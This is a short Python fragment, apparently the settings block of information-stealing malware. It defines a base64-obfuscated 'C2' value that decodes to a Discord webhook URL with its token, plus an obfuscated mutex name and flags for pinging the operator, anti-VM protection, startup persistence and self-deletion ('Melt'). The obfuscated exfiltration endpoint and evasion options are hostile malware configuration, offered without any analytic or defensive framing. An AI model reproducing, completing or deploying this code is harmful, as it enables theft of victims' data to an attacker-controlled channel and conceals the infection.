...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI0NzMxNTQ1MzE0NDIwMzQwNC85NWoxQWxaRGNoR2ZDMGpyM1g2Q3h4R1owSEExdGFIaTc5bkNpdXNFd3lYQXNZY2p0UmxFN29CUlFOalIwWmNwMUpERg==').decode())
    Mutex = base64.b64decode('dGVraGRTT2xtTGJYaXB4SA==').decode()
    PingMe = bool('true')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('true')
